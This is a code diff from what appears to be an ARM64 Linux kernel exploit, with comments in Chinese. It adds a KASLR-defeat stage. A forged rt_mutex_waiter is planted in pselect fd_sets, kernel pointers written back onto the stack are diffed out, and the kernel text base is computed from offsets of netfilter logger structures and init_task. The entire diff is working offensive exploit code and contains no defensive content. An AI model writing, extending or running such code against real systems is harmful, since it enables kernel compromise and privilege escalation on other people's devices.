@@ -140,6 +140,76 @@ static void slide_dump_fdsets(
   fflush(stdout);
 }
 
+/* 【读纸条背面的墨痕 v2 —— nfulnl_log_packet 数据别名】
+ * boot_id 路由只在 slide=0 有效(写入的是我们种的编译期假门牌)。
+ * 新路线:鬼标签被园长(PI 链)整理时,内核会把【真实内核指针】写进
+ * 栈上的鬼标签字段 —— pselect 返回时 fd_set 从内核栈拷回用户态,
+ * 对比"种进去的值"和"拷回来的值"就能看到墨痕:
+ *
+ *   loggers[1] (data 0x1fe2920)      ─┐
+ *   nfulnl_logger (data 0x1fe29c8)    ├ 编译期已知偏移
+ *   nfulnl_logger+0x10 logfn → nfulnl_log_packet (text) ─┘
+ *
+ * 回拷值若是指向这些结构的真实地址:
+ *   _stext = 泄漏值 - KIMAGE_TEXT_BASE - 编译期偏移
+ * 三个偏移逐一试算,2MB 对齐(ARM64 KASLR 约束)者即候选。 */
+static uint64_t slide_fdset_stext;
+
+static void slide_try_stext_candidate(uint64_t v, int set_idx, int word_idx) {
+  if ((v >> 48) != 0xffff) {
+    return;
+  }
+  struct {
+    uint64_t off;
+    const char *name;
+  } cands[] = {
+      {SLIDE_LOGGERS_0_1_OFF, "loggers[1]"},
+      {SLIDE_NFULNL_LOGGER_OFF, "nfulnl_logger"},
+      {SLIDE_INIT_TASK_OFF, "init_task"},
+  };
+  for (size_t i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
+    uint64_t stext = v - KIMAGE_TEXT_BASE - cands[i].off;
+    if (stext != 0 && (stext & 0x1fffffULL) == 0 && stext < 0x40000000ULL) {
+      pr_success("slide fdset-leak-candidate pid=%d value=%016llx at "
+                 "set=%d w%d assume=%s stext=%016llx slide=%016llx\n",
+                 getpid(), (unsigned long long)v, set_idx, word_idx,
+                 cands[i].name, (unsigned long long)stext,
+                 (unsigned long long)stext);
+      slide_fdset_stext = stext;
+    }
+  }
+  if ((v >> 32) == 0xffffff88ULL) {
+    pr_info("slide fdset-leak linear-heap value=%016llx at set=%d w%d "
+            "(slab/task 地址,不是 text;留作后续页内自包含参照)\n",
+            (unsigned long long)v, set_idx, word_idx);
+  }
+}
+
+static void slide_scan_fdset_leak(
+    const uint64_t pre_words[3][16], const fd_set *in, const fd_set *out,
+    const fd_set *ex, int words_per_set) {
+  const fd_set *sets[3] = {in, out, ex};
+  const char *names[3] = {"in", "out", "ex"};
+  int diffs = 0;
+  for (int s = 0; s < 3; s++) {
+    for (int w = 0; w < words_per_set && w < 16; w++) {
+      uint64_t v = fdset_get_word(sets[s], w);
+      if (v == pre_words[s][w]) {
+        continue;
+      }
+      diffs++;
+      pr_info("slide fdset DIFF %s[%d] pre=%016llx post=%016llx "
+              "(内核在鬼标签区写回的内容)\n",
+              names[s], w, (unsigned long long)pre_words[s][w],
+              (unsigned long long)v);
+      slide_try_stext_candidate(v, s, w);
+    }
+  }
+  pr_info("slide fdset diff total=%d fdset_stext=%016llx\n", diffs,
+          (unsigned long long)slide_fdset_stext);
+  fflush(stdout);
+}
+
 /* 【伪造假标签】把伪造的 rt_mutex_waiter 逐字(8 字节/格)写进 fd_set。
  * pselect 进内核后会把 fd_set 拷到栈上 —— 恰好盖住鬼标签的位置(shift 对齐)。
  * 11 个格子对应假标签的 11 个字段：树父/右/左、PI树父/右/左、
@@ -236,8 +306,19 @@ void slide_pselect_stack_copy(void) {
   fd_set ex;
   prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
-  slide_dump_fdsets(&in, &out, &ex,
-                    slide_pselect_words_per_set(), "pre-pselect");
+  /* 保存"种进去的值"副本 —— pselect 返回后对比找墨痕(内核写回) */
+  int words_per_set = slide_pselect_words_per_set();
+  uint64_t pre_words[3][16];
+  const fd_set *sets_pre[3] = {&in, &out, &ex};
+  for (int s = 0; s < 3; s++) {
+    for (int w = 0; w < words_per_set && w < 16; w++) {
+      pre_words[s][w] = fdset_get_word(sets_pre[s], w);
+    }
+    for (int w = words_per_set; w < 16; w++) {
+      pre_words[s][w] = 0;
+    }
+  }
+  slide_dump_fdsets(&in, &out, &ex, words_per_set, "pre-pselect");
 
   struct timespec timeout = {
     .tv_sec = PSELECT_TIMEOUT_SEC,
@@ -269,8 +350,10 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_calls));
   pr_info("slide pselect comparing fd_sets vs planted payload "
           "(diffs = kernel wrote back into the waiter stack region)\n");
-  slide_dump_fdsets(&in, &out, &ex,
-                    slide_pselect_words_per_set(), "post-pselect");
+  slide_dump_fdsets(&in, &out, &ex, words_per_set, "post-pselect");
+  /* 【墨痕扫描】post 与 pre 逐字对比,识别内核写回的真实指针,
+   * 按 loggers[1]/nfulnl_logger/init_task 偏移试算 _stext */
+  slide_scan_fdset_leak(pre_words, &in, &out, &ex, words_per_set);
   fflush(stdout);
 
   pthread_join(consumer, NULL);
@@ -625,7 +708,19 @@ uint64_t slide_child_leak_stext(void) {
   }
   pr_info("slide child route_done, reading boot_id\n");
 
-  return slide_read_stext();
+  /* 泄漏优先级:
+   * 1) boot_id 数据别名读出的 loggers 真值(老路由,slide=0 才有效)
+   * 2) fd_set 回拷墨痕(新路由:PI 链写进鬼标签的真实指针,
+   *    按 nfulnl_log_packet 数据别名三个偏移试算)
+   * 父进程侧还有 2MB 对齐二次校验兜底。 */
+  uint64_t stext = slide_read_stext();
+  if (!stext && slide_fdset_stext) {
+    stext = slide_fdset_stext;
+    pr_success("slide child fdset-route stext=%016llx (boot_id empty, "
+               "using nfulnl data-alias candidate)\n",
+               (unsigned long long)stext);
+  }
+  return stext;
 }
 
 /* 【第 1 关总入口】多次尝试(最多 40 轮)，每轮：
@@ -700,6 +795,13 @@ int slide_leak_kernel_base(void) {
     /* no waitpid: child parks with live waiter/owner threads */
 
     if (n == (ssize_t)sizeof(stext) && stext) {
+      /* 二次校验:ARM64 KASLR slide 必须 2MB 对齐且落在 1GB 内 */
+      if ((stext & 0x1fffffULL) != 0 ||
+          stext - KIMAGE_TEXT_BASE >= 0x40000000ULL) {
+        pr_warning("slide attempt %d stext sanity fail stext=%016llx\n",
+                   attempt, (unsigned long long)stext);
+        continue;
+      }
       kaslr_base = stext;
       kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
       kaslr_done = 1;
